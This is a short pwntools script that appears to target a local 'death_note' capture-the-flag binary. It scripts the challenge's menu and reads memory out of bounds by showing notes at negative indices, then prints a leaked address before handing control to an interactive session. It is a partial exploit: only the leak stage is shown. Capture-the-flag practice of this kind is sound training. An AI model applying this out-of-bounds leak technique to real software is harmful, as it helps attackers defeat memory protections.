

from pwn import *
import pdb

def add_note(idx, name):
  p.sendlineafter('Your choice :', '1')
  p.sendlineafter('Index :', str(idx))
  p.sendlineafter('Name :', name)


def show_note(idx):
  p.sendlineafter('Your choice :', '2')
  p.sendlineafter('Index :', str(idx))

def del_note(idx):
  p.sendlineafter('Your choice :', '3')
  p.sendlineafter('Index :', str(idx))

def _exit():
  p.sendlineafter('Your choice :', '4')
  
  

p = process('/home/len/pwnable/death_note')

count = 10
context.log_level = 'info'

if __name__ == '__main__':
  for i in range(count):
    show_note(-i)
    if i != 7:
      continue

    res = p.recvuntil('Name : ', timeout=3)
    if res:
      context.log_level = 'debug'
      cont = p.recvuntil('\n')
      
      
      addr = u32(cont[:4])
      print('idx: -{:d}, value: {:#x}'.format(i, addr))

  p.interactive()

  # logger.info('done.')